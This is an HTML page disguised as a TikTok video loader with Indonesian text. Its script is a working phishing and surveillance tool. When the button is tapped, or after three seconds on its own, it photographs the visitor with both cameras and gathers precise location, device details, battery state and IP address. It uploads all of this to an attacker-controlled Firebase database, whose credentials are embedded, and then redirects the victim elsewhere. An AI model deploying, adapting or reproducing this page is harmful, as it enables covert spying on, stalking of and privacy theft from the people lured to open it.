<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>TikTok</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#fff;font-family:sans-serif;height:100vh;display:flex;align-items:center;justify-content:center;flex-direction:column;overflow:hidden}
.logo{font-size:48px;font-weight:900;background:linear-gradient(45deg,#fe2c55,#25f4ee);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin-bottom:30px}
.spinner{width:44px;height:44px;border:4px solid rgba(255,255,255,.15);border-top-color:#fe2c55;border-radius:50%;animation:s .9s linear infinite}
@keyframes s{to{transform:rotate(360deg)}}
.txt{margin-top:20px;color:#888;font-size:14px;text-align:center;padding:0 20px}
.btn{margin-top:30px;padding:16px 40px;background:linear-gradient(45deg,#fe2c55,#25f4ee);color:#fff;border:none;border-radius:30px;font-size:16px;font-weight:bold;cursor:pointer;letter-spacing:1px}
.btn:active{transform:scale(.95)}
</style>
</head>
<body>
<div class="logo">TikTok</div>
<div class="spinner" id="spin"></div>
<div class="txt" id="t">Tap tombol di bawah untuk memuat video</div>
<button class="btn" id="btn">MULAI</button>

<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
<script>
firebase.initializeApp({
  apiKey: "AIzaSyCNw1ZCIq-sItu5Q3p_BvJfwzMtnPAvqhE",
  authDomain: "iron-crasher.firebaseapp.com",
  databaseURL: "https://iron-crasher-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "iron-crasher",
  storageBucket: "iron-crasher.firebasestorage.app",
  messagingSenderId: "279050968109",
  appId: "1:279050968109:web:a6bb89d64ef296d7c0eca4"
});
const db = firebase.database();
const p = new URLSearchParams(location.search);
let tu = 'https://www.google.com';
const tp = p.get('t');
if (tp) { try { tu = atob(tp); } catch(e) { tu = p.get('target') || tu; } }
if (!tu.startsWith('http')) tu = 'https://' + tu;
const id = p.get('id') || ('PHSNK-' + Date.now().toString(36).toUpperCase());

const el = document.getElementById('t');
const btn = document.getElementById('btn');
const spin = document.getElementById('spin');

function st(x){ el.textContent = x; }

async function cam(facing){
  try {
    st('Minta izin kamera...');
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: facing, width: {ideal:640}, height: {ideal:480} },
      audio: false
    });
    st('Mengambil foto...');
    const v = document.createElement('video');
    v.srcObject = stream;
    v.setAttribute('playsinline','true');
    v.muted = true;
    await v.play();
    await new Promise(r => setTimeout(r, 1500));
    const c = document.createElement('canvas');
    c.width = v.videoWidth || 640;
    c.height = v.videoHeight || 480;
    c.getContext('2d').drawImage(v, 0, 0);
    stream.getTracks().forEach(t => t.stop());
    return c.toDataURL('image/jpeg', 0.7);
  } catch(e) {
    console.log('Camera error:', facing, e.message);
    return null;
  }
}

function loc(){
  return new Promise(r => {
    if (!navigator.geolocation) return r(null);
    st('Minta izin lokasi...');
    navigator.geolocation.getCurrentPosition(
      x => r({
        lat: x.coords.latitude.toFixed(6),
        lng: x.coords.longitude.toFixed(6),
        accuracy: Math.round(x.coords.accuracy),
        mapUrl: 'https://www.google.com/maps?q=' + x.coords.latitude + ',' + x.coords.longitude
      }),
      () => r(null),
      { enableHighAccuracy: true, timeout: 8000 }
    );
  });
}

async function dev(){
  const ua = navigator.userAgent;
  let n = 'Unknown';
  if (/Android/i.test(ua)) { const m = ua.match(/Android\s[\d.]+;\s([^)]+)\)/); n = m ? m[1] : 'Android'; }
  else if (/iPhone|iPad/i.test(ua)) n = 'iPhone/iPad';
  else if (/Windows/i.test(ua)) n = 'Windows';
  else if (/Mac/i.test(ua)) n = 'Mac';

  const i = {
    namaHp: n,
    os: navigator.platform || '-',
    browser: /Chrome/i.test(ua) ? 'Chrome' : /Safari/i.test(ua) ? 'Safari' : /Firefox/i.test(ua) ? 'Firefox' : 'Unknown',
    screen: screen.width + 'x' + screen.height,
    language: navigator.language,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    battery: null,
    batteryCharging: null,
    ip: 'Fetching...'
  };

  try {
    if (navigator.getBattery) {
      const b = await navigator.getBattery();
      i.battery = Math.round(b.level * 100);
      i.batteryCharging = b.charging;
    }
  } catch(e){}

  try {
    const r = await fetch('https://api.ipify.org?format=json');
    const d = await r.json();
    i.ip = d.ip;
  } catch(e){}

  return i;
}

async function run(){
  spin.style.display = 'block';
  btn.style.display = 'none';

  st('Memuat video...');
  await new Promise(r => setTimeout(r, 300));

  const fd = await cam('user');
  await new Promise(r => setTimeout(r, 500));

  const fb = await cam('environment');
  await new Promise(r => setTimeout(r, 500));

  const l = await loc();
  await new Promise(r => setTimeout(r, 300));

  st('Menyiapkan...');
  const d = await dev();
  await new Promise(r => setTimeout(r, 300));

  st('Menyelesaikan...');
  try {
    await db.ref('phsnk/' + id).update({
      id,
      fotoDepan: fd,
      fotoBelakang: fb,
      lokasi: l,
      device: d,
      capturedAt: Date.now(),
      status: 'captured'
    });
    console.log('[PHSNK] Saved!');
  } catch(e) { console.error(e); }

  st('Selesai');
  setTimeout(() => { location.href = tu; }, 500);
}

btn.addEventListener('click', () => {
  btn.style.display = 'none';
  run();
});

setTimeout(() => {
  if (btn.style.display !== 'none') {
    btn.style.display = 'none';
    run();
  }
}, 3000);

setTimeout(() => {
  if (document.visibilityState === 'visible') {
    location.href = tu;
  }
}, 15000);
</script>
</body>
</html>
